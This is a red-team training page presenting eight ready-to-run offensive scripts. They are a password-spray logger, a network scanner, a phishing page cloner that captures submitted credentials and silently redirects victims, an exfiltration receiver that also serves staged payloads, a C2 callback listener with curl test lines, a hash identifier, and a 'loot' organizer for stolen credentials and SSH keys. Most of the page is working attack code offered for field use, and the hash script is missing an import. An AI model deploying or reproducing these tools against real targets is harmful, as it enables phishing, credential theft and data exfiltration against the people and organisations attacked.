---
layout: training-page
title: "Quick Coding Projects for Red Team Operators — Red Team Academy"
module: "Tool Development"
tags:
  - tool-dev
  - python
  - bash
  - projects
  - automation
  - scripts
page_key: "tool-dev-quick-projects"
---

<h1>Quick Coding Projects for Red Team Operators</h1>

<p>These are practical, self-contained projects that solve real problems during engagements. Each can be built in an afternoon and immediately used in the field. They fill gaps where existing tools are too heavy, too detectable, or don't exist. Every project includes a working implementation — modify and extend as needed.</p>

<h2>Project 1: Credential Spray Logger</h2>

<p>Password spraying produces a lot of output. This script wraps any spray tool (CrackMapExec, Kerbrute, Hydra) and filters to only show successful attempts, logging everything with timestamps for the report.</p>

<pre><code>#!/usr/bin/env python3
"""credential_spray_logger.py — wraps spray tools, logs only hits"""
import subprocess
import sys
import re
from datetime import datetime

LOGFILE = f"spray_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
SUCCESS_PATTERNS = [
    r'\[\+\]',           # CrackMapExec/NetExec success
    r'VALID',            # Kerbrute
    r'SUCCESS',          # generic
    r'login:.*password:', # Hydra
    r'\[200\]',          # HTTP-based
]

def main():
    if len(sys.argv) &lt; 2:
        print(f"Usage: {sys.argv[0]} &lt;spray command&gt;")
        print(f"Example: {sys.argv[0]} nxc smb 10.10.10.5 -u users.txt -p Summer2025!")
        sys.exit(1)

    cmd = sys.argv[1:]
    print(f"[*] Running: {' '.join(cmd)}")
    print(f"[*] Logging to: {LOGFILE}")

    hits = 0
    total = 0

    with open(LOGFILE, 'w') as log:
        log.write(f"Spray started: {datetime.now()}\n")
        log.write(f"Command: {' '.join(cmd)}\n\n")

        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, text=True)

        for line in proc.stdout:
            total += 1
            line = line.rstrip()
            log.write(f"{line}\n")

            for pattern in SUCCESS_PATTERNS:
                if re.search(pattern, line, re.IGNORECASE):
                    hits += 1
                    timestamp = datetime.now().strftime('%H:%M:%S')
                    print(f"\033[92m[HIT {timestamp}]\033[0m {line}")
                    break

        proc.wait()
        summary = f"\n[*] Done: {hits} hits from {total} attempts"
        print(summary)
        log.write(summary + "\n")

if __name__ == '__main__':
    main()</code></pre>

<h2>Project 2: Internal Network Discovery Dashboard</h2>

<p>During an internal pentest, you need a quick view of live hosts, open ports, and services. This script runs a fast discovery scan and outputs a clean HTML report you can open in a browser.</p>

<pre><code>#!/usr/bin/env python3
"""netdash.py — fast internal network discovery with HTML output"""
import subprocess
import json
import sys
from datetime import datetime

def nmap_scan(target, ports="22,80,135,443,445,1433,3306,3389,5432,5985,8080,8443"):
    """Run nmap and return parsed results"""
    cmd = [
        'nmap', '-sT', '-Pn', '--open', '-T4',
        '-p', ports, '-oX', '-', target
    ]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    return result.stdout

def parse_nmap_xml(xml_output):
    """Parse nmap XML output into structured data"""
    import xml.etree.ElementTree as ET
    root = ET.fromstring(xml_output)
    hosts = []
    for host in root.findall('.//host'):
        addr = host.find('.//address[@addrtype="ipv4"]')
        if addr is None:
            continue
        ip = addr.get('addr')
        hostname = ''
        hn = host.find('.//hostname')
        if hn is not None:
            hostname = hn.get('name', '')

        ports = []
        for port in host.findall('.//port'):
            state = port.find('state')
            if state is not None and state.get('state') == 'open':
                service = port.find('service')
                ports.append({
                    'port': port.get('portid'),
                    'proto': port.get('protocol'),
                    'service': service.get('name', '') if service is not None else '',
                    'product': service.get('product', '') if service is not None else '',
                })
        if ports:
            hosts.append({'ip': ip, 'hostname': hostname, 'ports': ports})
    return hosts

def generate_html(hosts, target):
    """Generate an HTML dashboard"""
    html = f"""&lt;!DOCTYPE html&gt;
&lt;html&gt;&lt;head&gt;&lt;title&gt;Network Dashboard - {target}&lt;/title&gt;
&lt;style&gt;
body {{ font-family: monospace; background: #1a1a2e; color: #0f0; padding: 20px; }}
table {{ border-collapse: collapse; width: 100%; margin: 10px 0; }}
th, td {{ border: 1px solid #333; padding: 8px; text-align: left; }}
th {{ background: #16213e; }}
tr:hover {{ background: #1a1a3e; }}
h1 {{ color: #e94560; }}
.port-high {{ color: #e94560; font-weight: bold; }}
&lt;/style&gt;&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Network Discovery — {target}&lt;/h1&gt;
&lt;p&gt;Scan time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}&lt;/p&gt;
&lt;p&gt;Hosts found: {len(hosts)}&lt;/p&gt;
&lt;table&gt;&lt;tr&gt;&lt;th&gt;IP&lt;/th&gt;&lt;th&gt;Hostname&lt;/th&gt;&lt;th&gt;Open Ports&lt;/th&gt;&lt;th&gt;Services&lt;/th&gt;&lt;/tr&gt;"""

    high_value = {'445': 'SMB', '1433': 'MSSQL', '3389': 'RDP',
                  '5985': 'WinRM', '5432': 'PostgreSQL', '3306': 'MySQL'}

    for host in sorted(hosts, key=lambda h: tuple(map(int, h['ip'].split('.')))):
        port_strs = []
        svc_strs = []
        for p in host['ports']:
            css = ' class="port-high"' if p['port'] in high_value else ''
            port_strs.append(f"&lt;span{css}&gt;{p['port']}/{p['proto']}&lt;/span&gt;")
            svc = p['product'] or p['service'] or ''
            if p['port'] in high_value:
                svc = f"&lt;b&gt;{high_value[p['port']]}&lt;/b&gt;" + (f" ({svc})" if svc else "")
            svc_strs.append(svc)

        html += f"""&lt;tr&gt;&lt;td&gt;{host['ip']}&lt;/td&gt;&lt;td&gt;{host['hostname']}&lt;/td&gt;
&lt;td&gt;{', '.join(port_strs)}&lt;/td&gt;&lt;td&gt;{', '.join(svc_strs)}&lt;/td&gt;&lt;/tr&gt;"""

    html += "&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;"
    return html

if __name__ == '__main__':
    if len(sys.argv) &lt; 2:
        print(f"Usage: {sys.argv[0]} &lt;target_range&gt;")
        print(f"Example: {sys.argv[0]} 10.10.10.0/24")
        sys.exit(1)

    target = sys.argv[1]
    print(f"[*] Scanning {target}...")
    xml = nmap_scan(target)
    hosts = parse_nmap_xml(xml)
    html = generate_html(hosts, target)

    outfile = f"netdash_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
    with open(outfile, 'w') as f:
        f.write(html)
    print(f"[+] {len(hosts)} hosts found — report: {outfile}")</code></pre>

<h2>Project 3: Phishing Page Cloner</h2>

<p>Clone any login page and add credential capture. More flexible than SET for custom targets — handles CSS, images, and form actions automatically.</p>

<pre><code>#!/usr/bin/env python3
"""phish_clone.py — clone a login page with credential capture"""
import requests
import re
import os
import sys
from urllib.parse import urljoin, urlparse
from http.server import HTTPServer, SimpleHTTPRequestHandler
from datetime import datetime

def clone_page(url, output_dir="phish_site"):
    """Download a page and rewrite forms to capture credentials"""
    os.makedirs(output_dir, exist_ok=True)

    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    resp = requests.get(url, headers=headers, verify=False)
    html = resp.text

    # Download CSS and JS files
    for tag, attr in [('link', 'href'), ('script', 'src'), ('img', 'src')]:
        for match in re.finditer(f'&lt;{tag}[^&gt;]+{attr}=["\']([^"\']+)["\']', html):
            resource_url = urljoin(url, match.group(1))
            filename = os.path.basename(urlparse(resource_url).path) or 'index'
            try:
                r = requests.get(resource_url, headers=headers, verify=False, timeout=5)
                filepath = os.path.join(output_dir, filename)
                with open(filepath, 'wb') as f:
                    f.write(r.content)
                html = html.replace(match.group(1), filename)
            except Exception:
                pass

    # Rewrite form actions to POST to our capture endpoint
    html = re.sub(
        r'(&lt;form[^&gt;]*action=)["\'][^"\']*["\']',
        r'\1"/capture"',
        html, flags=re.IGNORECASE
    )
    # Ensure method is POST
    html = re.sub(
        r'(&lt;form[^&gt;]*)(method=["\'][^"\']*["\'])',
        r'\1method="POST"',
        html, flags=re.IGNORECASE
    )

    with open(os.path.join(output_dir, 'index.html'), 'w') as f:
        f.write(html)

    print(f"[+] Cloned {url} to {output_dir}/")
    return output_dir

class PhishHandler(SimpleHTTPRequestHandler):
    """HTTP handler that captures POST data and redirects to real site"""
    def __init__(self, *args, redirect_url="", **kwargs):
        self.redirect_url = redirect_url
        super().__init__(*args, **kwargs)

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8', errors='replace')

        # Log captured credentials
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        ip = self.client_address[0]
        entry = f"[{timestamp}] {ip}: {body}\n"
        print(f"\033[91m[CAPTURED]\033[0m {entry.strip()}")

        with open('captured_creds.txt', 'a') as f:
            f.write(entry)

        # Redirect to real login page (victim sees "wrong password, try again")
        self.send_response(302)
        self.send_header('Location', self.redirect_url or '/')
        self.end_headers()

if __name__ == '__main__':
    if len(sys.argv) &lt; 2:
        print(f"Usage: {sys.argv[0]} &lt;target_login_url&gt; [port]")
        print(f"Example: {sys.argv[0]} https://mail.target.com/owa/auth/logon.aspx 8443")
        sys.exit(1)

    target_url = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) &gt; 2 else 8080

    site_dir = clone_page(target_url)
    os.chdir(site_dir)

    print(f"[*] Serving phishing page on port {port}")
    print(f"[*] Credentials logged to captured_creds.txt")
    server = HTTPServer(('0.0.0.0', port), PhishHandler)
    server.serve_forever()</code></pre>

<h2>Project 4: Automated Screenshot Collector</h2>

<p>Take screenshots of all web services discovered during a scan. Produces a visual catalog of the target environment for quick triage.</p>

<pre><code>#!/usr/bin/env python3
"""webshot.py — screenshot all web services from nmap/nxc output"""
import subprocess
import sys
import os
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

def take_screenshot(url, output_dir):
    """Use headless Chrome/Chromium to screenshot a URL"""
    filename = url.replace('://', '_').replace('/', '_').replace(':', '_') + '.png'
    filepath = os.path.join(output_dir, filename)

    cmd = [
        'chromium-browser', '--headless', '--disable-gpu', '--no-sandbox',
        '--disable-software-rasterizer',
        f'--screenshot={filepath}',
        '--window-size=1280,900',
        '--ignore-certificate-errors',
        '--timeout=10000',
        url
    ]

    try:
        subprocess.run(cmd, capture_output=True, timeout=15)
        if os.path.exists(filepath) and os.path.getsize(filepath) &gt; 0:
            return url, filepath, True
    except (subprocess.TimeoutExpired, Exception) as e:
        pass

    return url, filepath, False

def parse_targets(input_file):
    """Extract URLs from nmap XML, nxc output, or plain text"""
    urls = set()
    with open(input_file) as f:
        content = f.read()

    # Plain URLs (one per line)
    for line in content.splitlines():
        line = line.strip()
        if line.startswith('http'):
            urls.add(line)
        # IP:port format
        elif re.match(r'\d+\.\d+\.\d+\.\d+:\d+', line):
            ip, port = line.split(':')
            scheme = 'https' if port in ('443', '8443', '9443') else 'http'
            urls.add(f"{scheme}://{ip}:{port}")
        # Just IP
        elif re.match(r'\d+\.\d+\.\d+\.\d+$', line):
            urls.add(f"http://{line}")
            urls.add(f"https://{line}")

    return list(urls)

def generate_gallery(results, output_dir):
    """Generate HTML gallery of screenshots"""
    html = """&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Web Screenshots&lt;/title&gt;
&lt;style&gt;
body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
.grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 15px; }
.card { background: #1a1a2e; border: 1px solid #333; padding: 10px; }
.card img { width: 100%; cursor: pointer; }
.card a { color: #e94560; }
h1 { color: #e94560; }
&lt;/style&gt;&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Web Service Screenshots&lt;/h1&gt;
&lt;div class="grid"&gt;"""

    for url, filepath, success in sorted(results, key=lambda x: x[0]):
        if success:
            fname = os.path.basename(filepath)
            html += f"""&lt;div class="card"&gt;
&lt;a href="{url}" target="_blank"&gt;{url}&lt;/a&gt;
&lt;a href="{fname}" target="_blank"&gt;&lt;img src="{fname}" /&gt;&lt;/a&gt;
&lt;/div&gt;"""

    html += "&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;"
    with open(os.path.join(output_dir, 'gallery.html'), 'w') as f:
        f.write(html)

if __name__ == '__main__':
    if len(sys.argv) &lt; 2:
        print(f"Usage: {sys.argv[0]} &lt;targets_file&gt; [output_dir]")
        sys.exit(1)

    targets_file = sys.argv[1]
    output_dir = sys.argv[2] if len(sys.argv) &gt; 2 else 'screenshots'
    os.makedirs(output_dir, exist_ok=True)

    urls = parse_targets(targets_file)
    print(f"[*] Screenshotting {len(urls)} URLs...")

    results = []
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(take_screenshot, url, output_dir): url for url in urls}
        for future in as_completed(futures):
            url, filepath, success = future.result()
            status = "\033[92m[OK]\033[0m" if success else "\033[91m[FAIL]\033[0m"
            print(f"  {status} {url}")
            results.append((url, filepath, success))

    generate_gallery(results, output_dir)
    ok = sum(1 for _, _, s in results if s)
    print(f"[+] {ok}/{len(urls)} screenshots saved to {output_dir}/gallery.html")</code></pre>

<h2>Project 5: Webhook Exfiltration Server</h2>

<p>A lightweight server that receives data from O.MG cables, DuckyScript payloads, or any HTTP exfiltration. Logs everything, serves files, and displays captures in real time.</p>

<pre><code>#!/usr/bin/env python3
"""exfil_server.py — receive and display exfiltrated data"""
import http.server
import json
import os
import sys
from datetime import datetime
from urllib.parse import parse_qs, urlparse

LOGFILE = "exfil_log.txt"
SERVE_DIR = "payloads"  # directory to serve files from

class ExfilHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        """Receive exfiltrated data via POST"""
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        content_type = self.headers.get('Content-Type', '')

        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        ip = self.client_address[0]
        path = self.path

        # Parse body based on content type
        try:
            if 'json' in content_type:
                data = json.loads(body)
                display = json.dumps(data, indent=2)
            else:
                display = body.decode('utf-8', errors='replace')
        except Exception:
            display = body.hex()

        # Display in terminal with color
        print(f"\n\033[91m{'='*60}\033[0m")
        print(f"\033[93m[{timestamp}] POST {path} from {ip}\033[0m")
        print(f"\033[92m{display}\033[0m")
        print(f"\033[91m{'='*60}\033[0m\n")

        # Log to file
        with open(LOGFILE, 'a') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"[{timestamp}] POST {path} from {ip}\n")
            f.write(f"Content-Type: {content_type}\n")
            f.write(f"{display}\n")

        # Save binary uploads (multipart form data with files)
        if 'multipart' in content_type:
            upload_dir = f"uploads/{timestamp.replace(':', '-').replace(' ', '_')}"
            os.makedirs(upload_dir, exist_ok=True)
            filepath = os.path.join(upload_dir, 'upload.bin')
            with open(filepath, 'wb') as f:
                f.write(body)
            print(f"[+] File saved: {filepath}")

        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b'ok')

    def do_GET(self):
        """Serve files from payloads directory (for staging)"""
        # Parse query string for data exfil via GET params
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        if params:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            ip = self.client_address[0]
            print(f"\033[93m[{timestamp}] GET exfil from {ip}: {params}\033[0m")
            with open(LOGFILE, 'a') as f:
                f.write(f"[{timestamp}] GET {self.path} from {ip}\n")

        # Serve files normally
        super().do_GET()

    def log_message(self, format, *args):
        """Suppress default access logs (we have our own)"""
        pass

if __name__ == '__main__':
    port = int(sys.argv[1]) if len(sys.argv) &gt; 1 else 8080
    os.makedirs(SERVE_DIR, exist_ok=True)
    os.chdir(SERVE_DIR)

    print(f"[*] Exfil server listening on 0.0.0.0:{port}")
    print(f"[*] POST data to http://YOUR_IP:{port}/collect")
    print(f"[*] GET files from http://YOUR_IP:{port}/&lt;filename&gt;")
    print(f"[*] Logs: {LOGFILE}")

    server = http.server.HTTPServer(('0.0.0.0', port), ExfilHandler)
    server.serve_forever()</code></pre>

<h2>Project 6: Hash Identifier &amp; Formatter</h2>

<p>During engagements you encounter hashes from many sources (NTDS dump, web apps, SAM). This tool identifies hash types and formats them for hashcat.</p>

<pre><code>#!/usr/bin/env python3
"""hashid_format.py — identify hashes and output hashcat-ready format"""
import re
import sys

HASH_PATTERNS = [
    # (name, regex, hashcat_mode, example)
    ("NTLM", r'^[a-fA-F0-9]{32}$', 1000, "aad3b435b51404ee"),
    ("NTLMv2", r'^[^:]+::[^:]+:[a-fA-F0-9]{16}:[a-fA-F0-9]{32}:[a-fA-F0-9]+$', 5600, "user::DOMAIN:challenge:response:blob"),
    ("NetNTLMv1", r'^[^:]+::[^:]+:[a-fA-F0-9]{48}:[a-fA-F0-9]{48}:[a-fA-F0-9]{16}$', 5500, ""),
    ("MD5", r'^[a-fA-F0-9]{32}$', 0, "5d41402abc4b2a76b"),
    ("SHA1", r'^[a-fA-F0-9]{40}$', 100, "aaf4c61ddcc5e8a2"),
    ("SHA256", r'^[a-fA-F0-9]{64}$', 1400, "2cf24dba5fb0a30e"),
    ("SHA512", r'^[a-fA-F0-9]{128}$', 1700, ""),
    ("bcrypt", r'^\$2[aby]?\$\d{2}\$.{53}$', 3200, "$2a$10$..."),
    ("Kerberoast (TGS)", r'^\$krb5tgs\$', 13100, "$krb5tgs$23$*..."),
    ("AS-REP", r'^\$krb5asrep\$', 18200, "$krb5asrep$23$..."),
    ("DCC2 (mscash2)", r'^\$DCC2\$', 2100, "$DCC2$10240#user#..."),
    ("DPAPI Master Key", r'^\$DPAPImk\$', 15900, ""),
    ("WPA PMKID", r'^[a-fA-F0-9]{32}\*', 22000, ""),
    ("MySQL 4.1+", r'^\*[a-fA-F0-9]{40}$', 300, "*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9"),
    ("PostgreSQL MD5", r'^md5[a-fA-F0-9]{32}$', 12, "md5..."),
    ("Linux shadow (SHA512)", r'^\$6\$', 1800, "$6$rounds=5000$..."),
    ("Linux shadow (SHA256)", r'^\$5\$', 7400, "$5$rounds=5000$..."),
    ("Linux shadow (MD5)", r'^\$1\$', 500, "$1$salt$..."),
    ("MSSQL 2012+", r'^0x0200', 1731, "0x0200..."),
    ("secretsdump format", r'^[^:]+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}:::', None, "Administrator:500:aad3b:ntlm:::"),
]

def identify_hash(hash_str):
    """Identify hash type and return matches"""
    matches = []
    for name, pattern, mode, example in HASH_PATTERNS:
        if re.match(pattern, hash_str.strip()):
            matches.append((name, mode))
    return matches

def process_file(filepath):
    """Process a file of hashes"""
    stats = {}
    with open(filepath) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue

            matches = identify_hash(line)
            if matches:
                for name, mode in matches:
                    stats[name] = stats.get(name, 0) + 1
                    if mode:
                        print(f"[{name}] hashcat -m {mode} — {line[:60]}...")
            else:
                print(f"[?] Unknown: {line[:60]}...")

    print(f"\n--- Summary ---")
    for name, count in sorted(stats.items(), key=lambda x: -x[1]):
        mode = next((m for n, _, m, _ in HASH_PATTERNS if n == name), '?')
        print(f"  {name}: {count} hashes (hashcat -m {mode})")

if __name__ == '__main__':
    if len(sys.argv) &lt; 2:
        print(f"Usage: {sys.argv[0]} &lt;hash_or_file&gt;")
        print(f"Example: {sys.argv[0]} hashes.txt")
        print(f"Example: {sys.argv[0]} 'aad3b435b51404eeaad3b435b51404ee'")
        sys.exit(1)

    target = sys.argv[1]
    if os.path.isfile(target):
        process_file(target)
    else:
        matches = identify_hash(target)
        if matches:
            for name, mode in matches:
                print(f"[+] {name} — hashcat -m {mode}")
        else:
            print(f"[-] Unknown hash format")</code></pre>

<h2>Project 7: Quick C2 Callback Checker</h2>

<p>Lightweight HTTP/DNS listener that just confirms callbacks — no full C2, just "did my payload execute?" Used to test delivery before deploying a real C2.</p>

<pre><code>#!/usr/bin/env python3
"""callback_checker.py — lightweight listener for payload callback confirmation"""
import http.server
import threading
import sys
import socket
from datetime import datetime

callbacks = []

class CallbackHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        timestamp = datetime.now().strftime('%H:%M:%S')
        ip = self.client_address[0]
        ua = self.headers.get('User-Agent', 'none')
        path = self.path

        entry = f"[{timestamp}] HTTP {ip} — {path} — UA: {ua}"
        callbacks.append(entry)
        print(f"\033[92m[CALLBACK]\033[0m {entry}")

        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'OK')

    def log_message(self, *args):
        pass

    def do_POST(self):
        self.do_GET()

def dns_listener(port=5353):
    """Listen for DNS queries (basic — logs query names)"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', port))
    print(f"[*] DNS listener on UDP:{port}")

    while True:
        data, addr = sock.recvfrom(512)
        timestamp = datetime.now().strftime('%H:%M:%S')
        # Extract query name from DNS packet (simplified)
        try:
            qname = []
            i = 12  # skip DNS header
            while data[i] != 0:
                length = data[i]
                qname.append(data[i+1:i+1+length].decode())
                i += length + 1
            name = '.'.join(qname)
            entry = f"[{timestamp}] DNS {addr[0]} — {name}"
            callbacks.append(entry)
            print(f"\033[93m[DNS CALLBACK]\033[0m {entry}")
        except Exception:
            pass

if __name__ == '__main__':
    http_port = int(sys.argv[1]) if len(sys.argv) &gt; 1 else 8080

    print(f"[*] HTTP listener on :{http_port}")
    print(f"[*] Test: curl http://YOUR_IP:{http_port}/test")
    print(f"[*] DNS:  nslookup test.YOUR_IP YOUR_IP -port=5353")
    print(f"[*] Waiting for callbacks...\n")

    # Start DNS listener in background
    dns_thread = threading.Thread(target=dns_listener, daemon=True)
    dns_thread.start()

    # Start HTTP listener
    server = http.server.HTTPServer(('0.0.0.0', http_port), CallbackHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n[*] {len(callbacks)} callbacks received")
        for cb in callbacks:
            print(f"  {cb}")</code></pre>

<h2>Project 8: Loot Organizer</h2>

<p>After an engagement, organize all collected credentials, hashes, and session data into a structured format for reporting.</p>

<pre><code>#!/bin/bash
# loot_organizer.sh — organize engagement loot into report-ready structure

LOOT_DIR="${1:-.}"
OUTPUT="loot_report_$(date +%Y%m%d).md"

echo "# Engagement Loot Report" &gt; "$OUTPUT"
echo "Generated: $(date)" &gt;&gt; "$OUTPUT"
echo "" &gt;&gt; "$OUTPUT"

# Find and categorize credentials
echo "## Credentials Found" &gt;&gt; "$OUTPUT"
echo "" &gt;&gt; "$OUTPUT"

# NTLM hashes (secretsdump format)
if find "$LOOT_DIR" -name "*.ntds" -o -name "*secretsdump*" -o -name "*ntds*" 2&gt;/dev/null | grep -q .; then
    echo "### NTLM Hashes" &gt;&gt; "$OUTPUT"
    echo '```' &gt;&gt; "$OUTPUT"
    find "$LOOT_DIR" -name "*.ntds" -o -name "*secretsdump*" 2&gt;/dev/null | while read f; do
        echo "# Source: $f"
        # Count unique hashes, show admin accounts
        grep -i "administrator\|admin\|svc-\|sql\|backup" "$f" 2&gt;/dev/null | head -20
    done &gt;&gt; "$OUTPUT"
    echo '```' &gt;&gt; "$OUTPUT"
fi

# Plaintext creds from various sources
echo "### Plaintext Credentials" &gt;&gt; "$OUTPUT"
echo '```' &gt;&gt; "$OUTPUT"
grep -rhi "password\|passwd\|pwd\|credential" "$LOOT_DIR" \
    --include="*.txt" --include="*.log" --include="*.xml" --include="*.conf" \
    2&gt;/dev/null | sort -u | head -50 &gt;&gt; "$OUTPUT"
echo '```' &gt;&gt; "$OUTPUT"

# SSH keys
echo "" &gt;&gt; "$OUTPUT"
echo "### SSH Keys" &gt;&gt; "$OUTPUT"
find "$LOOT_DIR" -name "id_*" -o -name "*.pem" -o -name "*.key" 2&gt;/dev/null | while read f; do
    echo "- \`$f\` ($(wc -l &lt; "$f") lines)" &gt;&gt; "$OUTPUT"
done

# Summary statistics
echo "" &gt;&gt; "$OUTPUT"
echo "## Statistics" &gt;&gt; "$OUTPUT"
echo "- Total files: $(find "$LOOT_DIR" -type f | wc -l)" &gt;&gt; "$OUTPUT"
echo "- Hash files: $(find "$LOOT_DIR" -name "*.ntds" -o -name "*hash*" | wc -l)" &gt;&gt; "$OUTPUT"
echo "- Screenshots: $(find "$LOOT_DIR" -name "*.png" -o -name "*.jpg" | wc -l)" &gt;&gt; "$OUTPUT"
echo "- Config files: $(find "$LOOT_DIR" -name "*.conf" -o -name "*.xml" -o -name "*.ini" | wc -l)" &gt;&gt; "$OUTPUT"

echo "[+] Report generated: $OUTPUT"</code></pre>

<h2>Resources</h2>

<ul>
  <li>Impacket — <code>github.com/fortra/impacket</code></li>
  <li>CrackMapExec / NetExec — <code>github.com/Pennyw0rth/NetExec</code></li>
  <li>Hashcat — <code>hashcat.net</code></li>
  <li>Nuclei — <code>github.com/projectdiscovery/nuclei</code></li>
  <li>EyeWitness (screenshot tool) — <code>github.com/RedSiege/EyeWitness</code></li>
  <li>GoWitness — <code>github.com/sensepost/gowitness</code></li>
</ul>
